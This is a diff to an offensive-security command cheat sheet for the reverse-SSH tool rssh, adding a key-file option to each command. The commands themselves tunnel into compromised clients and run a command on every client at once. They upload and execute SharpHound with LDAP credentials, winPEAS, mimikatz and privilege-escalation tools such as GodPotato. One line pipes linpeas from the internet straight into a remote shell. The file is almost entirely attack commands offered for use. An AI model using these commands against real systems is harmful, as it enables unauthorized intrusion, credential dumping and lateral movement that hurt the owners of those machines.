@@ -14,52 +14,52 @@ docker run --rm -d -p3232:2222 -v ./rssh-data:/data -e EXTERNAL_ADDRESS=<externa
 Set-PSReadLineKeyHandler -Key "Ctrl+Backspace" -Function BackwardDeleteChar
 
 # RSSH ssh
-ssh -J rssh <rssh-client>
+ssh -i ~/.ssh/rssh-key -J rssh <rssh-client>
 
 # RSSH scp
-scp -J rssh <rssh-client>
+scp -i ~/.ssh/rssh-key -J rssh <rssh-client>
 
 # RSSH: Port forward and listen remotely
-ssh -J rssh -N -R <remoteinterface>:<remoteport>:<localinterface>:<localport> <rssh-client>
+ssh -i ~/.ssh/rssh-key -J rssh -N -R <remoteinterface>:<remoteport>:<localinterface>:<localport> <rssh-client>
 
 # RSSH: Port forward and listen locally
-ssh -J rssh -N -L <localinterface>:<localport>:<remoteinterface>:<remoteport> <rssh-client>
+ssh -i ~/.ssh/rssh-key -J rssh -N -L <localinterface>:<localport>:<remoteinterface>:<remoteport> <rssh-client>
 
 # RSSH: Dynamic port forward
-ssh -J rssh -N -D 9050 <rssh-client>
+ssh -i ~/.ssh/rssh-key -J rssh -N -D 9050 <rssh-client>
 
 # RSSH: run command on all clients
-ssh rssh ls | awk '{print $3}' | while read line; do ssh -J rssh "$line" '<command>'; done
+ssh rssh ls | awk '{print $3}' | while read line; do ssh -i ~/.ssh/rssh-key -J rssh "$line" '<command>'; done
 
 # RSSH: run sharphound on client
 if [[ ! -f www/sh.exe ]]; then mkdir -p www; (cd www && <download_sh>); fi
-scp -J rssh www/sh.exe '<rssh-client>:C:/ProgramData'
-ssh -J rssh <rssh-client> 'C:\ProgramData\sh.exe -c All --ldapusername "<user_with_password>" --ldappassword "<password_for_user>" --zipfilename sh.zip'
+scp -i ~/.ssh/rssh-key -J rssh www/sh.exe '<rssh-client>:C:/ProgramData'
+ssh -i ~/.ssh/rssh-key -J rssh <rssh-client> 'C:\ProgramData\sh.exe -c All --ldapusername "<user_with_password>" --ldappassword "<password_for_user>" --zipfilename sh.zip'
 
 # RSSH: run winpeas on client
 if [[ ! -f www/peas.exe ]]; then mkdir -p www; (cd www && <download_peas>); fi
-scp -J rssh www/peas.exe '<rssh-client>:C:/ProgramData'
-ssh -J rssh <rssh-client> 'C:\ProgramData\peas.exe' | tee peas-'<rssh-client>'.log
+scp -i ~/.ssh/rssh-key -J rssh www/peas.exe '<rssh-client>:C:/ProgramData'
+ssh -i ~/.ssh/rssh-key -J rssh <rssh-client> 'C:\ProgramData\peas.exe' | tee peas-'<rssh-client>'.log
 
 # RSSH: run linpeas on client
-curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | ssh -J rssh <rssh-client> 'sh' | tee peas-'<rssh-client>'.log
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | ssh -i ~/.ssh/rssh-key -J rssh <rssh-client> 'sh' | tee peas-'<rssh-client>'.log
 
 # RSSH: run mimikatz on client
 if [[ ! -f www/mimikatz.exe ]]; then mkdir -p www; (cd www && <download_mimikatz>); fi
-scp -J rssh www/mimikatz.exe '<rssh-client>:C:/ProgramData'
-ssh -J rssh <rssh-client> 'C:\ProgramData\mimikatz.exe' | tee mimikatz-'<rssh-client>'.log
+scp -i ~/.ssh/rssh-key -J rssh www/mimikatz.exe '<rssh-client>:C:/ProgramData'
+ssh -i ~/.ssh/rssh-key -J rssh <rssh-client> 'C:\ProgramData\mimikatz.exe' | tee mimikatz-'<rssh-client>'.log
 
 # RSSH: upload adpeas to client
 if [[ ! -f www/adpeas.ps1 ]]; then mkdir -p www; (cd www && <download_ad_peas>); fi
-scp -J rssh www/adpeas.ps1 '<rssh-client>:C:/ProgramData'
+scp -i ~/.ssh/rssh-key -J rssh www/adpeas.ps1 '<rssh-client>:C:/ProgramData'
 
 # RSSH: upload runascs to client
 if [[ ! -f www/runascs.exe ]]; then mkdir -p www; (cd www && <download_runas_cs>); fi
-scp -J rssh www/runascs.exe '<rssh-client>:C:/ProgramData'
+scp -i ~/.ssh/rssh-key -J rssh www/runascs.exe '<rssh-client>:C:/ProgramData'
 
 # RSSH: upload godpotato to client
 if [[ ! -f www/godpotato.exe ]]; then mkdir -p www; (cd www && <download_godpotato>); fi
-scp -J rssh www/godpotato.exe '<rssh-client>:C:/ProgramData'
+scp -i ~/.ssh/rssh-key -J rssh www/godpotato.exe '<rssh-client>:C:/ProgramData'
 
 $ interface: ip link show | awk -F': ' '{print $2}' | grep .
 $ external_ip: ip -f inet addr show <interface> | awk '/inet / {print $2}' | cut -d'/' -f1
